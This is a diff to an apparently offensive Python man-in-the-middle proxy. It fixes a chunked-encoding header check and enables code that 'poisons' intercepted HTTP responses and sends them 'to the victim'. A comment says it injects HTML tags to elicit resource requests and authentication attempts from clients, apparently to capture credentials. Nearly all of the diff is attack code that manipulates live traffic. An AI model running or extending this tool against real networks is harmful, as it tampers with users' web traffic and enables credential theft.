@@ -41,9 +41,13 @@ def acceptConnection(connection, RxConnectionNum):
 
 
 def checkForCTE(TxResponse, RxConnectionNum):
-    if 'Transport-Encoding: chunked' in TxResponse:
+    if 'Transfer-Encoding: chunked' in TxResponse:
+        if TESTING:
+            printMsg(RxConnectionNum, 'CTE detected')
         return True
     elif 'Content-Length:' in TxResponse:
+        if TESTING:
+            printMsg(RxConnectionNum, 'No CTE detected')
         return False
     else:
         printMsg(RxConnectionNum, 'Chunking detection error detected')
@@ -320,9 +324,20 @@ def processTxResponse(TxConnection, RxConnection, RxConnectionNum):
                     # only check the first TCP chunk (i.e. headers) for CTE as will only be present in headers
                     CTE = checkForCTE(TxResponseChunk, RxConnectionNum)
                     checkedForCTE = True
-                if CTE == True:
-                    pass
-                    #processChunkedTxResponse(TxResponseChunk, TxConnection, RxConnection, RxConnectionNum)
+                if CTE:
+                    # weaken the RxResponse headers
+                    #TxResponseChunk = weakenRxResponse(TxResponseChunk, RxConnectionNum)
+                    # poison the RxResponse body
+                    TxResponseChunk = poisonRxResponse(TxResponseChunk, RxConnectionNum)
+                    # write the current manipulated chunk to disk
+                    writeRawData(TxResponseChunk, TESTING_FILE_RxResponse, RxConnectionNum, True)
+                    # finally send the chunk to the victim
+                    try:
+                        RxConnection.send(TxResponseChunk)
+                        if VERBOSETESTING:
+                            printMsg(RxConnectionNum, 'RxResponse sent')
+                    except socket.error as errMsg:
+                        printMsg(RxConnectionNum, 'RxResponse socket error: ' + str(errMsg))
                 else:
                     # non CTE, we don't have full response yet, so just append and move onto next loop iteration
                     TxResponse += TxResponseChunk
@@ -341,15 +356,15 @@ def processTxResponse(TxConnection, RxConnection, RxConnectionNum):
             printMsg(RxConnectionNum, 'TxConnection socket error detected: ' + str(errMsg))
     # we have to wait till we have the whole response to be able to manipulate non-chunked responses,
     if not CTE:
+        writeRawData(RxResponse, TESTING_FILE_RxResponse, RxConnectionNum)
+        # weaken the RxResponse headers
+        IntermediateResponse = weakenRxResponse(TxResponse, RxConnectionNum)
+        # poison the RxResponse body
+        IntermediateResponse = poisonRxResponse(IntermediateResponse, RxConnectionNum)
+        # update the Content-Length header to reflect any changes
+        RxResponse = manipulateContentLength(IntermediateResponse)
+        # finally send the whole thing to the victim
         try:
-            writeRawData(RxResponse, TESTING_FILE_RxResponse, RxConnectionNum, True)
-            # weaken the RxResponse headers
-            IntermediateResponse = weakenRxResponse(TxResponse, RxConnectionNum)
-            # poison the RxResponse body
-            IntermediateResponse = poisonRxResponse(IntermediateResponse, RxConnectionNum)
-            # update the Content-Length header to reflect any changes
-            RxResponse = manipulateContentLength(IntermediateResponse)
-            # finally send the whole thing to the victim
             RxConnection.send(RxResponse)
             if VERBOSETESTING:
                 printMsg(RxConnectionNum, 'RxResponse sent')
@@ -393,7 +408,7 @@ def weakenRxRequest(RxRequest, RxConnectionNum, RxHeaders):
     return TxRequest
 
 
-# Inject HTML tag into response to ellicit resource request (and therefore auth attempt) from client
+# Inject HTML tag into response to elicit resource request (and therefore auth attempt) from client
 def weakenRxResponse(TxResponse, RxConnectionNum):
     # set up intermediate variable so multiple weakenings can be completed
     IntermediateResponse = TxResponse
